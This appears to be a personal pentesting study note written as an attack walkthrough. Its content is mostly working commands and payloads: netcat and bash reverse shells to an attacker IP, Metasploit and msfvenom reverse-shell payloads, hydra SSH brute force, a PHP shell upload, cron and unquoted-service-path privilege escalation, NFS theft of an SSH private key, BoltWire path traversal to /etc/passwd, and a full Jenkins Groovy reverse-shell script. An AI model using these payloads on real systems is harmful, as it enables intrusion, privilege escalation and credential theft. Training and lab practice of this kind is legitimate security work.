

#### Types of Shell Connections:

- Reverse Shell:
	- A Reverse Shell is a process where the target connects to the attackbox/hacker's machine and establishes a shell connection
	- Reverse shell is performed used Netcat with below example syntax:
		- AttackBox/Hacker's machine: `nc -lvp 4444`
			- nc - netcat
			- -l - listen
			- -v - verbose
			- -p - port 
		- Target machine: `nc {ip-address} {port} -e /bin/sh` (Linux)
			- `nc {ip-address} {port} -e command.exe` (windows)
				- nc- netcat
				- -e - establish
- Bind Shell:
	- A Bind Shell is a process where the attacker/hacker machine connects to the target machine to the opened port
		- Bind shell is performed when there is a open port in target machine, which is opened by a exploit for example 4444 port
			- Target Machine: `nc -lvp 4444 -e /bin/sh`
			- Attacker Machine: `nc {ip-address} {port}`

#### Types of Payloads:

- Non-Staged Payload:
	- Sending exploit shellcode all at once
	- Larger in size and wont work always
		- Ex:
			- `windows/meterpreter_reverse_tcp`
- Staged Payload:
	- Sending payload in stages
	- Can be less stable
		- Ex:
			- `windows/meterpreter/reverse_tcp`


#### Gaining Root with Metasploit:

-  Just a demo exploit procedure to gain root shell access to a vulnerable machine through metasploit
	- Step-1:
		- Check which exploit is feasible for the machine, after gathering all the information in the reconnaissance and scanning phases, as for the example, we can use smb exploit to gain access to the machine
		- Start metasploit using
			- `msfconsole`
		- Search for the exploit (ex: trans2open)
			- `search trans2open`
		- Once you find the machine OS use that module from metasploit
			- `use 0/1/2/exploit/linux/samba/trans2open`
		- Once the exploit module is selected, use the options command to check for the target host and the payload options
			- `options`
		- Set the RHOST (Target machine {ip-address})
			- `set RHOSTS {ip-address}`
		- Set the payload as well, if we want to proceed with Staged Payload or Non-Staged Payload
			- `set payload linux/x86/shell_reverse_tcp`
		- Once all the options are set  as required, run the exploit using the exploit command:
			- `exploit`
		- Once the exploit is successful,  a shell connection will be established to the target machine and you can confirm the connection, by typing 'whoami


#### Brute Force Attack (SSH):

 - Brute force attack is trial and error to guess passwords, encryption keys, and other login credentials. As per below example, we will brute forcing SSH login to the vulnerable machine with 'hydra' and 'metasploit'
	- Syntax for **hydra**:
		- `hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://{ip-address} -t 4 -V`
			- -l is for user
			- -P - this is for the wordlists path for the passwords
			- -t - threads count
			- -V - Verbose
	- **Metasploit** (msfconsole):
		- Step 1:
			- Search for ssh
				- `search ssh`
			- After finding the module in auxiliary section, use the module:
				- `use auxiliary/scanner/ssh/ssh_login`
			- Set the options as required:
				- `set USERNAME root`
				- `set RHOSTS {ip-address}`
				- `set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt`
				- `set THREADS 10`
				- `set VERBOSE True`
			- Once the options are set, run the module
				- `run`


#### Exploiting a Vulnerable Webserver:

- Web page is hosted in Apache server (Apache/2.4.38) and has a student academy website hosted with the URL: http://{ip-address}/academy
- After navigating the website, a upload button is observed in the student profile update page, to update the student's profile picture.
- As the upload functionality doesn't have any file format constrains, we are going to run an exploit using php to do a reverse shell connection.
	- https://github.com/pentestmonkey/php-reverse-shell
	- After getting the PHP exploit from above link for reverse shell, copy the exploit from github paste into a php file, into your local and update the ip-address in the exploit to the attacker's machine, so that the target machine to enable a reverse shell connection to the attacker's machine. we can change the port is required.
	- Once we have the file ready, before uploading the file, enable listening the attacker machine as ex:
		- `nc -nvlp 1234`
	- Once the attacker machine is listening, upload the exploit to the website and wait for the php exploit to run, once it ran, we can see that the port attacker machine is listening to, now have access to the target's shell.
- We are in the target machine, but we may not be a root user, to do privilege escalation, check on the privilege escalation section.


#### Privilege Escalation of a vulnerable target machine(Linux):

- After gaining access to the target machine, we are going to escalate our privilege to root, for that we will be using a tool called 'linpeas'
	- https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
- This tool helps to check in linux machine to find a possibility for privilege escalation
- We copying the linpeas.sh file from the github, we will placing the file in a folder, easier to transfter the file to the target machine.
- Once we have the file, we will hosting a server in the folder, we have the file using python
	- `python3 -m http.server 80`
- Once we have server up, we can go back to the shell we have opened from target machine, navigate to the tmp folder use the command.
	- `wget http://{ip-address}/linpeas.sh`
	- This downloads the linpeas file to the target machine.
- Once we have the exploit code in the target machine, we need to make the file executable using the below command:
	- `chmod +x linpeas.sh`
- Once done, execute the file `./linpeas.sh`, this will provide a lot of information regarding the privilege escalation.
- After running, the PE exploit in the target machine, we observe that, we observed a sql username and password used in the phpmyadmin config file, which can be used to login to the database 
- We have observed, that we have a different user who has admin privileges using the `cat /etc/passwd`
- Using the SQL password, we received from the linpeas.sh exploit, we will try to ssh to the target machine with the newly found admin privileged user.
- After opening a SSH with the username and password we observed in the php config, we have observed that a backup script is running with the help of a cron job, with escalated privilege, so using the backup script, we will try to gain root access to the machine
- We have use `crontab -l` to check if there are any cron jobs running for the user
	- `crontab -u root -l` to check if any cron job running for the user provided 
- We can also check if there is any system dtimers and see if we have any script running for the backup
	- Using `systemctl list-timers`
- To check, all of the process running on the machine, we can use a tool called 'pspy', download it from github (https://github.com/DominicBreuker/pspy) and place it in the transfers folder of the attacker machine and same as earlier, go to the target's  ssh and go to the tmp and use the wget to grab the file using server running.
	- `wget http://{ip-address}/pspy64`
	- After that provide the execute permission with the chmod command.
		- `chmod +x pspy64`
		- Execute the file using `./pspy64`
	- This will show, all of the process running in the target machine and as thought we have a cron job running with escalated privilege, is executing the backup script
- We will be using this to our advantage, to gain root privileged access
	- We will be using  a BASH script one liner for the reverse shell from the cheat sheet (https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
	- We will be updating the one liner `bash -i >& /dev/tcp/{ip-address}/8081 0>&1` into the backup.sh script. {Ip-address} is attacker machine ip-address
	- We can give any port as required and once we have updated the script, in attacker machine, we will be listening for the port 8081, using the netcat command:
		- `nc -nvlp 8081`
	- Once the cron job runs the backup.sh script, we will be provided with shell access from the target machine with root privileged access using reverse shell exploit.


#### Privilege Escalation of a vulnerable target machine(Windows):

After gaining access to the target machine, we are going to escalate our privilege to root/admin, for that we will be using a tool called 'winpeas'
	- https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
- This tool helps to check in windows machine to find a possibility for privilege escalation
- We copying the winpeas.exe file from the github, we will placing the file in a folder, easier to transfter the file to the target machine.
- Once we have the file, we will hosting a server in the folder, we have the file using python
	- `python3 -m http.server 80`
- Once we have server up, we can go back to the command prompt we have opened from target machine, navigate to a folder, where the logged in user has write access/would have write access, basically it would it inside the user folder.
	- Path: C://Users/{user}
	- Use the below command, to grab the file from the python hosted server to the target machine. we will be using certutil.exe for this action.
		- `certutil.exe -urlcache -f http://{ip-address}/winpeas.exe winpeas.exe`
			- Giving winpeas.exe at the end, is to name the file as required.
			- This downloads the winpeas file to the target machine.
- After running winpeas, we have observed a program that is installed called WiseBootAssistant, which helps to identify the boot time of the machine.
- We also observe that the winpeas detected the below details:
	- `WiseBootAssistant(WiseCleaner.com - Wise Boot Assistant)[C:\Program Files (x86)\Wise\Wise Care 365\BootTime.exe] - Auto - Running - No quotes and Space detected`
	- `YOU CAN MODIFY THIS SERVICE: AllAccess`
	- `File Permissions: Administrators [AllAccess]`
	- `Possible DLL Hijacking in binary folder: C:\Program Files (x86)\Wise\Wise Care 365 (Administrators [AllAccess])`
- As mentioned above that the user installed application WiseBootAssistant is auto running with no quotes and space detected. This means that the path is unquoted, so windows considers the path not an absolute path and try to execute every thing were ever there is a space. for example:
	- Windows will try to run: `C:\Program.exe` and then `C:\Program Files.exe` and then `C:\Program Files (x86).exe`  and as such, we will exploiting this to our advantage by placing an exploit in the Wise folder with Wise.exe as windows will run the path `C:\Program Files (x86)\Wise\Wise.exe` as there is a space.
	- We will be creating a exploit for reverse shell and place the exe(executable file) in the Wise folder and make the system run the file.
- Using the below command, we will create a exploit exe file with msfvenom.
	- `msfvenom -p windows/x64/shell_reverse_tcp LHOST={Attacker_IP_Address} LPORT=7777 -f exe > Wise.exe`
	- Any port can be used
- Once the exe is generated, place it in the transfers folder or the path were the python server is being hosted and start the python server.
- Open a new command prompt in attacker machine and start the netcat for the port 7777 or which ever its provided.
	- `nc -nvlp 7777`
- Now go back to the target machine's exploited command prompt and go to the path `C:\Program Files (x86)\Wise` and run the certutil command again to grab the Wise.exe exploit and place it in the Wise folder.
- Now if we run the Wise.exe it will provide us with the command prompt with the same user permissions, who ran the file, which we don't require.
- To get the system access, system should run the exe file and provide the reverse shell with system privileges, to do that, we will stop the service and start it again, so system runs the Wise.exe file and provide system access.
	- `sc stop WiseBootAssistant` - Stop the service
	- `sc query WiseBootAssistant` - Query and check the status of the service
	- `sc start WiseBootAssistant` - Start the service.
- Once the service start command is executed, we will be granted with the command shell in attacker's machine in the netcat 7777 with the system privileges.
- Once we have the access, we can check the below commands:
	- `whoami`
	- `systeminfo`


#### Privilege Escalation to Root with SUDO permissions for ZIP(Linux):

- After all the exploitations, we land in the shell of a user with least privilege and we are trying to escalate our privilege to root.
- So, the first thing to check is if the logged in user has any sudo privileges already, we can check this with `sudo -l`
	- This provides with the commands that can be used by the user without any password as  root.
		- `sudo -l`
			- Output: `user {username} may run the following commands on {machine-name}: (root) NOPASSWD: /usr/bin/zip`
- As the user is having the permission to run zip functionality without password and with root privileges, we are going to exploit this to get a root shell
- We can use the website 'https://gtfobins.github.io/' search for SUDO escalations with ZIP and below syntax is provided to escalate:
	- `TF=$(mktemp -u)`
	- `sudo zip $TF /etc/hosts -T -TT 'sh #'
	- `sudo rm $TF`
- Once the commands are ran one by one, with the second we will be provided with a shell with root privileges and the last command to exit out

#### Exploit NFS:

- NFS stands for Network File System, a file system standard that allows users to access files on a remote computer as if they were on their local computer.
- We can use the command 'showmount' to show the NFS mounting paths available for the ip-address
	- Syntax:
		- `showmount -e {target-ip-address}`
			- Output: `Export list for {ip-address}:`
				- `/srv/nfs {ip-address....}`
- Once we have the path, we can create a path/directory to mount the path, we found in showmount
	- `mkdir /mnt/dev`
	- `mount -t nfs {ip-address}:/srv/nfs /mnt/dev`
		- -t is type
- Once done, we can navigate to the path /mnt/dev and check if we have any thing in the file share.
- Once the zip file is unzipped, we observed that the zip file had `id_rsa`, which is a private key file that is part of an SSH key pair
- Using the id_rsa, we can try a SSH connection to the target-machine.
	- `ssh -i id_rsa {username}@{ip-address}`
	- The `-i` option in SSH is used to specify an identity file (private key) for authentication. When you connect to a remote server using SSH, the default key (usually located at `~/.ssh/id_rsa`) is used. If you have a different key you want to use for authentication, you can specify it with the `-i` option.

#### Cracking zip password:

- For example, we found a zip file in the NFS path and it is password protected, so to crack the password we will be using 'fcrackzip', we need to install it in the machine.
	- `apt install fcrackzip`
- Once installed, we can use the below syntax for finding the zip password
	- `fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip`
		- -v - verbosity, to show all the details
		- -u - unzip
		- -D - Dictionary attack using the wordlists provided
		- -p - Indicates the file to the unzipped
- Once completed, we will be provided with the password to unzip
	- `unzip save.zip`


#### Local File Inclusion (Bolt Wire exploit):

- Bolt wire has a local file inclusion exploit, which can used to navigate to the linux paths and read the contents of the file using path traversal or backtracking the path.
- Local File Inclusion, can be done as below:
	- `http://{ip-address}/boltwire/index.php?p=action.search&action=../../../../../../../etc/passwd`
	- After the search action parameter in the path, we can traverse back to the root folder with the ../ and after few enumerations, we can fetch the /etc/passwd file to check the user details of the machine.


#### Reverse Shell Using Jenkins (Script Console):

- Once the jenkins is accessed with brute force and password spraying attack, In Manage Jenkins tab, we have access to Jenkins CLI or  Script Console.
- In this attack, we are using Script Console of jenkins to gain access to the command prompt of the machine.
- Once we have opened the script console, in google search for the jenkins script console exploit, you will find reverse shell groovy script in github, copy and paste it in the script console.
	- https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
	- Payload:
		  `String host="localhost";`
		  `int port=8044;`
		  `String cmd="cmd.exe";`
		  `Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();`
		- Update the localhost to the attacker's ip-address, and change the port if required.
		- Before running the script, make sure to listen to that port in the attacker's machine using:
			- `nc -nvlp 8044`
		- Then running the script will provide the command prompt access with the logged in user.

